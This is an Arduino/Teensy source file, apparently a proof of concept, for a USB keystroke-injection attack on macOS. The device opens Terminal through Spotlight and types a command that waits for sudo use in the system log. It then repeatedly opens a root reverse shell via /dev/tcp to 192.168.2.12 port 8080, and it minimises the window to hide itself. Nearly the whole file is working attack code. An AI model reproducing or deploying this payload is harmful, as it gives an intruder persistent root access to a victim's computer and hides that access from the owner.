
//quick and dirty port using some of samy's code from USBdriverby as a framework for PoC
//tested working on teensy 3.1
void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}
void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

int led = 13; 

void setup () 
{ 
  pinMode(led, OUTPUT);
  digitalWrite(led, HIGH);   
  delay(500);              
  digitalWrite(led, LOW);   
  delay(500); 
  digitalWrite(led, HIGH);   
  delay(500);               
  digitalWrite(led, LOW);   
  delay(500);               
  digitalWrite(led, HIGH);   
  delay(500);              
  digitalWrite(led, LOW);   
  delay(500);               
  cmd(KEY_SPACE);
  //open spotlight
  delay(1000);
  Keyboard.println("Terminal");
  delay(1000);
  Keyboard.write(KEY_RETURN);
  //open terminal
  delay(1000);
  cmd(KEY_N);
  //open a new window
  delay(1000);
  Keyboard.println("tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do while true; do sudo bash -i >& /dev/tcp/192.168.2.12/8080 0>&1; done; done");
  //configured for localhost callback on 8080; modify with bigphish output
  delay(10);
  cmd(KEY_M);
  //hide all terminal windows
  digitalWrite(led, HIGH);   
  delay(500);              
  digitalWrite(led, LOW);    
  delay(500); 
  digitalWrite(led, HIGH);   
  delay(500);               
  digitalWrite(led, LOW);   
  delay(500);             
  digitalWrite(led, HIGH);  
  delay(500);              
  digitalWrite(led, LOW);
}

void loop() {
  //do nothing
}




